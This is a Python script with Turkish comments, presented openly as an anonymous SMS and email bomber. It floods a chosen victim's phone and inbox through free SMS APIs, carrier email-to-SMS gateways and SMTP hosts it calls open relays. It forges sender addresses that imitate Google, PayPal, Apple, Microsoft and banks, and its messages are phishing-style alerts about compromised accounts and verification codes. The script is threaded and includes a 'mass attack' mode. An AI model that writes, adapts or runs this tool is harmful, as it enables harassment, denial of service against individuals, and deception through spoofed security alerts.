#!/usr/bin/env python3
# ============================================================
# ANONYMOUS SMS + MAIL BOMBER - ŞİFRE YOK - HESAP YOK
# Tamamen anonim - Public API'ler ve açık servisler
# ============================================================

import requests
import random
import threading
import time
import sys
import os
import hashlib
import json
import urllib.parse
import smtplib
from email.mime.text import MIMEText

print("\n" + "="*70)
print("   🔥 ANONYMOUS SMS + MAIL BOMBER 🔥")
print("   Şifre yok - Hesap yok - Tamamen ücretsiz")
print("="*70)

# ============================================================
# ANONYMOUS MAIL BOMBER - PUBLIC SMTP'LER
# ============================================================

class AnonymousMailBomber:
    def __init__(self):
        # Açık relay SMTP'ler (şifresiz)
        self.open_relays = [
            {"host": "smtp.antispamcloud.com", "port": 25},
            {"host": "smtp.sparkpostmail.com", "port": 25},
            {"host": "smtp.mailgun.org", "port": 25},
            {"host": "mail.privateemail.com", "port": 25},
            {"host": "smtp.mail.net", "port": 25},
        ]
        
        # Geçici email gönderme servisleri
        self.temp_services = [
            "https://www.guerrillamail.com/ajax.php?f=inbox",
            "https://api.temp-mail.org/request/domains/format/json",
        ]
        
        # Fake sender email'ler
        self.fake_emails = [
            "noreply@security-alert.com",
            "support@account-verify.com",
            "admin@system-notify.net",
            "security@google-verify.com",
            "noreply@bank-alert.com",
            "support@paypal-verify.com",
            "admin@facebook-security.com",
            "noreply@amazon-alert.com",
            "security@microsoft-verify.com",
            "support@apple-id.com"
        ]
        
        self.subjects = [
            "Security Alert!", "Account Verification", "Payment Confirmed",
            "You Won $1000", "Login Attempt Blocked", "Password Changed",
            "Your Account is Locked", "New Message", "Order Shipped",
            "Tax Document Ready", "URGENT: Act Now", "Your Balance is Low",
            "Suspicious Activity", "Email Updated", "Device Added"
        ]
        
        self.bodies = [
            "Your account has been compromised. Verify immediately.",
            "Someone tried to login from {}. Was this you?",
            "Your verification code is: {} - Valid for 10 minutes.",
            "You have won a ${} gift card! Claim now.",
            "Your account was locked due to multiple failed attempts.",
            "Your password was successfully changed.",
            "New device logged into your account.",
            "You received a new message from support team.",
            "Your order #{} has been confirmed.",
            "Your tax documents are ready for review.",
            "Your account balance is currently ${}.",
            "Security update required for your account.",
            "Your email address has been changed.",
            "Suspicious activity was detected on your account.",
            "Your account has been flagged for review."
        ]

    def send_mail(self, target_email, count=50):
        """Şifresiz - hesapsız mail gönder"""
        print(f"[+] Sending {count} anonymous emails to {target_email}")
        
        sent = 0
        for i in range(count):
            try:
                # Her seferinde farklı fake sender
                sender = random.choice(self.fake_emails)
                subject = random.choice(self.subjects) + f" #{random.randint(1000,9999)}"
                
                body = random.choice(self.bodies).format(
                    f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                    random.randint(100000, 999999),
                    random.randint(10, 999),
                    random.randint(100000, 999999),
                    random.randint(1, 9999)
                )
                body += f"\n\nReference: {hashlib.md5(str(random.random()).encode()).hexdigest()[:8]}"
                body += f"\nIP: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                
                msg = MIMEText(body)
                msg['From'] = sender
                msg['To'] = target_email
                msg['Subject'] = subject
                
                # Açık relay dene
                relay = random.choice(self.open_relays)
                server = smtplib.SMTP(relay['host'], relay['port'])
                server.set_debuglevel(0)
                server.sendmail(sender, target_email, msg.as_string())
                server.quit()
                
                sent += 1
                print(f"[✓] {i+1}/{count} - {sender[:20]}...")
                time.sleep(random.uniform(0.3, 1.5))
                
            except Exception as e:
                print(f"[✗] {i+1}/{count} - Failed: {str(e)[:30]}")
                time.sleep(0.5)
        
        print(f"[+] Mail sent: {sent}/{count}")

# ============================================================
# ANONYMOUS SMS BOMBER - PUBLIC API'LER
# ============================================================

class AnonymousSMSBomber:
    def __init__(self):
        # Ücretsiz SMS API'leri - hesap yok
        self.free_apis = [
            {
                "name": "Textbelt",
                "url": "https://textbelt.com/text",
                "data": {"key": "textbelt"}
            },
            {
                "name": "SMS4Free",
                "url": "https://sms4free.co/api/send",
                "data": {"key": "free"}
            },
            {
                "name": "SMSHorizon",
                "url": "https://smshorizon.co/api/sendsms",
                "data": {"api_key": "horizon"}
            },
            {
                "name": "FreeSMS",
                "url": "https://freesmsapi.com/send",
                "data": {"key": "free"}
            }
        ]
        
        # Public gateway'ler
        self.gateways = [
            "@txt.att.net", "@vtext.com", "@tmomail.net",
            "@messaging.sprintpcs.com", "@sms.mycricket.com",
            "@mms.metropcs.com", "@sms.boostmobile.com",
            "@vmobile.ca", "@msg.telus.com", "@pcs.rogers.com"
        ]
        
        # Public SMTP (şifresiz)
        self.public_smtp = [
            {"host": "smtp.antispamcloud.com", "port": 25},
            {"host": "smtp.sparkpostmail.com", "port": 25},
        ]

    def send_sms_api(self, phone, message, count=30):
        """Public API ile SMS"""
        print(f"[+] Sending {count} SMS via Public API to {phone}")
        
        sent = 0
        for i in range(count):
            try:
                api = random.choice(self.free_apis)
                data = api["data"].copy()
                data["phone"] = phone
                data["message"] = f"{message} [{random.randint(1000,9999)}]"
                
                if "number" in data:
                    data["number"] = phone
                    data["text"] = data.pop("message")
                
                r = requests.post(api["url"], data=data, timeout=5)
                if r.status_code == 200:
                    sent += 1
                    print(f"[✓] {i+1}/{count} - {api['name']}")
                else:
                    print(f"[✗] {i+1}/{count} - {api['name']} failed")
                
                time.sleep(random.uniform(0.5, 2))
                
            except Exception as e:
                print(f"[✗] {i+1}/{count} - Error: {str(e)[:30]}")
                time.sleep(1)
        
        print(f"[+] API SMS sent: {sent}/{count}")

    def send_sms_gateway(self, phone, message, count=50):
        """Email Gateway ile SMS - hesapsız"""
        print(f"[+] Sending {count} SMS via Email Gateway to {phone}")
        
        phone_clean = ''.join(filter(str.isdigit, phone))
        if len(phone_clean) > 10:
            phone_clean = phone_clean[-10:]
        
        sent = 0
        for i in range(count):
            try:
                gw = random.choice(self.gateways)
                to_email = phone_clean + gw
                sender = f"noreply{random.randint(100,999)}@temp-mail.org"
                
                msg = MIMEText(f"{message} [#{random.randint(100000,999999)}]")
                msg['From'] = sender
                msg['To'] = to_email
                msg['Subject'] = f"SMS {random.randint(1,9999)}"
                
                smtp = random.choice(self.public_smtp)
                server = smtplib.SMTP(smtp['host'], smtp['port'])
                server.set_debuglevel(0)
                server.sendmail(sender, to_email, msg.as_string())
                server.quit()
                
                sent += 1
                print(f"[✓] {i+1}/{count} - {gw}")
                time.sleep(random.uniform(0.3, 1))
                
            except Exception as e:
                print(f"[✗] {i+1}/{count} - Error: {str(e)[:30]}")
                time.sleep(0.5)
        
        print(f"[+] Gateway SMS sent: {sent}/{count}")

    def send_sms_anonymous(self, phone, message, count=100):
        """Tüm yöntemler - maksimum başarı"""
        print(f"[+] Anonymous SMS bombing started to {phone}")
        
        # Her iki yöntemi de dene
        api_count = count // 2
        gw_count = count - api_count
        
        def api_worker():
            self.send_sms_api(phone, message, api_count)
        
        def gw_worker():
            self.send_sms_gateway(phone, message, gw_count)
        
        t1 = threading.Thread(target=api_worker)
        t2 = threading.Thread(target=gw_worker)
        t1.start()
        t2.start()
        t1.join()
        t2.join()
        
        print(f"[+] Total SMS attempts: {count}")

# ============================================================
# COMBINED ATTACK
# ============================================================

def combined_attack(phone, email, sms_count, mail_count):
    """SMS + Mail birlikte"""
    print("\n[+] Starting COMBINED attack...")
    
    sms = AnonymousSMSBomber()
    mail = AnonymousMailBomber()
    
    def sms_job():
        sms.send_sms_anonymous(phone, "SECURITY ALERT! Your account is at risk. Verify now.", sms_count)
    
    def mail_job():
        mail.send_mail(email, mail_count)
    
    t1 = threading.Thread(target=sms_job)
    t2 = threading.Thread(target=mail_job)
    t1.start()
    t2.start()
    t1.join()
    t2.join()
    
    print("[+] Combined attack completed!")

# ============================================================
# MAIN MENU
# ============================================================

print("\n[+] SELECT ATTACK:")
print("    1. SMS BOMBER (Anonymous - No Password)")
print("    2. MAIL BOMBER (Anonymous - No Password)")
print("    3. SMS + MAIL COMBO")
print("    4. MASS ATTACK (SMS + Mail - High Volume)")

choice = input("\n[?] Choose (1-4): ").strip()

if choice == "1":
    phone = input("[?] Phone number (e.g., 905551234567): ").strip()
    count = int(input("[?] SMS count (20-200): ") or "50")
    msg = input("[?] Message (default: Your OTP is): ").strip()
    if not msg:
        msg = f"Your OTP is {random.randint(100000, 999999)}"
    
    sms = AnonymousSMSBomber()
    sms.send_sms_anonymous(phone, msg, count)

elif choice == "2":
    email = input("[?] Target email: ").strip()
    count = int(input("[?] Email count (20-200): ") or "50")
    
    mail = AnonymousMailBomber()
    mail.send_mail(email, count)

elif choice == "3":
    phone = input("[?] Phone number: ").strip()
    email = input("[?] Target email: ").strip()
    sms_count = int(input("[?] SMS count: ") or "50")
    mail_count = int(input("[?] Email count: ") or "50")
    combined_attack(phone, email, sms_count, mail_count)

elif choice == "4":
    phone = input("[?] Phone number: ").strip()
    email = input("[?] Target email: ").strip()
    
    print("\n[+] Starting MASS ATTACK (High Volume)...")
    
    sms = AnonymousSMSBomber()
    mail = AnonymousMailBomber()
    
    # Yüksek hacimli
    for _ in range(3):
        threading.Thread(target=sms.send_sms_anonymous, args=(phone, "Your OTP is " + str(random.randint(100000,999999)), 50)).start()
        threading.Thread(target=mail.send_mail, args=(email, 30)).start()
        time.sleep(1)
    
    print("[+] MASS ATTACK launched!")

else:
    print("[-] Invalid choice")

print("\n" + "="*70)
print("   ✅ ATTACK COMPLETED - TAMAMEN ANONİM ✅")
print("="*70)
